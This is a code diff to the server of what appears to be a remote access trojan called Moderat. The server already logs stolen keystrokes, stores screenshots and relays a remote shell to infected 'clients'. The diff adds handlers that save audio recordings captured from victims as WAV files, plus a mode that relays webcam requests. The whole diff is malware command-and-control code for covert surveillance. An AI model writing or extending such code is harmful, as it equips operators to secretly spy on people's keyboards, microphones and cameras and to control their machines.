@@ -14,8 +14,10 @@ from db.ClientsManagment import ClientsManagment
 from db.ModeratorsManagment import ModeratorsManagment
 from db.ScreenshotsManager import ScreenshotsManager
 from db.KeyloggerManager import KeyloggerManager
+from db.AudioManagment import AudioManager
 from factory.PhotoFactory import save_image
 from factory.KeyFactory import html_generator
+from factory.AudioFactory import wav_generator
 
 LOGFILE = 'server.log'
 CLIENTS_PORT = 4434
@@ -39,6 +41,7 @@ manageClients = ClientsManagment()
 manageModerators = ModeratorsManagment()
 manageScreenshots = ScreenshotsManager()
 manageKeylogs = KeyloggerManager()
+manageAudio = AudioManager()
 
 # Clear Clients Status
 manageClients.set_status_zero()
@@ -169,6 +172,12 @@ class ModeratServerProtocol(Protocol):
             html_path, datetime_stamp = html_generator(key, keylogger_info, DATA_STORAGE)
             manageKeylogs.save_keylog(key, datetime_stamp, html_path)
             log.info('Keylogs Saved (%s)' % key)
+
+        elif mode == 'audioLogs':
+            audio_info = ast.literal_eval(payload)
+            wav_path, datetime_stamp = wav_generator(key, audio_info, DATA_STORAGE)
+            manageAudio.save_audio(key, datetime_stamp, wav_path)
+            log.info('Audio Saved (%s)' % key)
 
         elif moderators.has_key(session_id):
             log.info('Send Data to Moderator (%s)' % moderators[session_id]['username'])
@@ -381,6 +390,10 @@ class ModeratServerProtocol(Protocol):
             self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
         # Desktop Screenshot
         elif data['mode'] == 'getScreen':
+            log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
+            self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
+        # Webcamera
+        elif data['mode'] == 'getWebcam':
             log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
             self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
         # Remote Shell
